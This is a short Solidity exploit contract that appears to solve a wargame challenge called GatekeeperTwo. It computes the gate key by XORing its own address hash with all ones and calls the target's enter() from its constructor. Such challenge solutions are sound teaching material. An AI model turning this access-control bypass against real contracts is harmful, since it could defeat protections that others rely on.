pragma solidity ^0.6.0;

interface GatekeeperTwoInterface {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GateTwoTicket {
    constructor(address _targetContract) public {
        // Set up the contract
        GatekeeperTwoInterface gk = GatekeeperTwoInterface(_targetContract);
        // Calculate the LHS of the gateThree XOR requirement
        uint64 leftPart = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        // Get a variable containing a unit64 that is as large as possible (all 1s)
        uint64 expectedResult = uint64(0)-1;
        // XOR the all 1s variable with the leftPart to get the data needed for the key
        uint64 rightPart = leftPart ^ expectedResult;
        // Pass the calculated key to the contract
        gk.enter(bytes8(rightPart));
    }
}
